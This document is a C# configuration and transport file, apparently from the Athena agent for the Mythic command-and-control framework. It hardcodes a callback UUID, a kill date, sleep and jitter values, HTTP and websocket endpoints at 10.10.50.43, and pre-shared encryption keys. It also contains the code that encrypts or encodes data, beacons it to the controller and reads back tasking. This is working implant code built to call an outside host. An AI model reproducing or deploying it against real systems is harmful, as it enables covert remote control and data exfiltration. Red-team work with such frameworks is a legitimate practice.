﻿#define PROFILETYPE

using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.IO;
using System.Net.Http;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class MythicConfig
    {
        public HTTPS httpConfig { get; set; }
        public SMB smbConfig { get; set; }
        public Websocket websocketConfig { get; set; }
        public string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        
        public MythicConfig()
        {

            //this.uuid = "%UUID%";
            //this.killDate = DateTime.Parse("killdate");
            //int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
            //this.sleep = sleep;
            //int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            //this.jitter = jitter;
            //this.httpConfig = new HTTPS(this.uuid);
            //this.smbConfig = new SMB();
            //this.websocketConfig = new Websocket();          
            this.uuid = "a6b34cb2-7694-4f6d-b202-bf7d78445f0b";
            this.killDate = DateTime.Parse("2022-08-22");
            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 10;
            this.sleep = sleep;
            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.httpConfig = new HTTPS(this.uuid);
            this.smbConfig = new SMB();
            this.websocketConfig = new Websocket(this.uuid);
        }
    }
    public class HTTPS
    {
        public string userAgent { get; set; }
        public string hostHeader { get; set; }
        public string getURL { get; set; }
        public string postURL { get; set; }
        public string psk { get; set; }
        public string param { get; set; }
        public DateTime killDate { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        //Change this to Dictionary or Convert from JSON string?
        public string headers { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        public PSKCrypto crypt { get; set; }

        public HTTPS(string uuid)
        {
            //int callbackPort = Int32.Parse("callback_port");
            //string callbackHost = "callback_host";
            //string callbackURL = $"{callbackHost}:{callbackPort}";
            //this.userAgent = "user-agent";
            //this.hostHeader = "%HOSTHEADER%";
            //this.getURL = "callback_host:callback_port/get_uri?query_path_name";
            //this.postURL = "callback_host:callback_port/post_uri";
            //this.param = "query_path_name";
            //this.proxyHost = "proxy_host:proxy_port";
            //this.proxyPass = "proxy_pass";
            //this.proxyUser = "proxy_user";
            //this.psk = "AESPSK";
            ////Doesn't do anything yet
            //this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            int callbackPort = Int32.Parse("80");
            string callbackHost = "callback_host";
            string callbackURL = $"{callbackHost}:{callbackPort}";
            this.userAgent = "user-agent";
            this.hostHeader = "%HOSTHEADER%";
            this.getURL = "http://10.10.50.43/index.html?q=";
            this.postURL = "http://10.10.50.43/data";
            this.param = "query_path_name";
            this.proxyHost = "proxy_host:proxy_port";
            this.proxyPass = "proxy_pass";
            this.proxyUser = "proxy_user";
            this.psk = "EJWwOWUKwZ3ESBjh3TyzdeCTbqFKLssGDZbX+7BTLNc=";
            
            //Doesn't do anything yet
            this.encryptedExchangeCheck = bool.Parse("True");

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                Globals.encrypted = true;
            }
        }
        public async Task<string> Send(object obj)
        {
            try
            {

                string json = JsonConvert.SerializeObject(obj);
                if (Globals.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                }

                var content = new StringContent(json);
                var response = await Globals.client.PostAsync(Globals.mc.MythicConfig.httpConfig.postURL, content);
                string msg = response.Content.ReadAsStringAsync().Result;

                if (Globals.encrypted)
                {
                    msg = this.crypt.Decrypt(msg);
                }
                else
                {
                    msg = Misc.Base64Decode(msg).Substring(36);
                }
                return msg;
            }
            catch (Exception e)
            {
                return "";
            }
        }
    }
    public class Websocket
    {
        public string psk { get; set; }
        public string endpoint { get; set; }
        public string userAgent { get; set; }
        public string callbackHost { get; set; }
        public int callbackInterval { get; set; }
        public int callbackJitter { get; set; }
        public int callbackPort { get; set; }
        public string hostHeader { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        public ClientWebSocket ws { get; set; }
        public PSKCrypto crypt { get; set; }

        public Websocket(string uuid)
        {
            Console.WriteLine("Creating.");
            //int callbackPort = Int32.Parse("callback_port");
            //string callbackHost = "callback_host";
            //string callbackURL = $"{callbackHost}:{callbackPort}";
            //this.endpoint = "ENDPOINT_REPLACE";
            //this.userAgent = "USER_AGENT";
            //this.hostHeader = "%HOSTHEADER%";
            //this.psk = "AESPSK";
            //this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            //if (!string.IsNullOrEmpty(this.psk))
            //{
            //    this.crypt = new PSKCrypto(uuid, this.psk);
            //    Globals.encrypted = true;
            //}
            int callbackPort = Int32.Parse("8081");
            string callbackHost = "ws://10.10.50.43";
            this.endpoint = "socket";
            string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
            this.userAgent = "USER_AGENT";
            this.hostHeader = "%HOSTHEADER%";
            this.psk = "Y5u8XXPCpooetMVuPFUIjmK3ASseLAIvNeJVbW9pOTY=";
            //this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                Globals.encrypted = true;
            }
            this.ws = new ClientWebSocket();
            Connect(callbackURL);
        }

        public bool Connect(string url)
        {
            try
            {
                ws = new ClientWebSocket();
                ws.ConnectAsync(new Uri(url), CancellationToken.None);
                while(ws.State == WebSocketState.Connecting)
                {
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        public async Task<string> Send(object obj)
        {
            try
            {
                string json = JsonConvert.SerializeObject(obj);
                Console.WriteLine(json);
                //json = this.crypt.Encrypt(json);
                byte[] msg = System.Text.Encoding.ASCII.GetBytes(json);

                await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
                Console.WriteLine("Sent.");
                //await Send(ws, json);
                string result = await Receive(ws);
                //return this.crypt.Decrypt(result);
                return result;
            }
            catch (Exception e)
            {
                return "";
            }
        }
        static async Task<string> Receive(ClientWebSocket socket)
        {
            Console.WriteLine("Getting response");
            var buffer = new ArraySegment<byte>(new byte[2048]);
            do
            {
                WebSocketReceiveResult result;
                using (var ms = new MemoryStream())
                {
                    do
                    {
                        result = await socket.ReceiveAsync(buffer, CancellationToken.None);
                        ms.Write(buffer.Array, buffer.Offset, result.Count);
                    } while (!result.EndOfMessage);

                    if (result.MessageType == WebSocketMessageType.Close)
                        break;

                    ms.Seek(0, SeekOrigin.Begin);
                    using (var reader = new StreamReader(ms, Encoding.UTF8))
                        return(await reader.ReadToEndAsync());
                }
            } while (true);
            return "";
        }
        static async Task Send(ClientWebSocket socket, string data)
        {
            await socket.SendAsync(Encoding.UTF8.GetBytes(data), WebSocketMessageType.Text, true, CancellationToken.None);
        }
    }
    public class SMB
    {

    }
}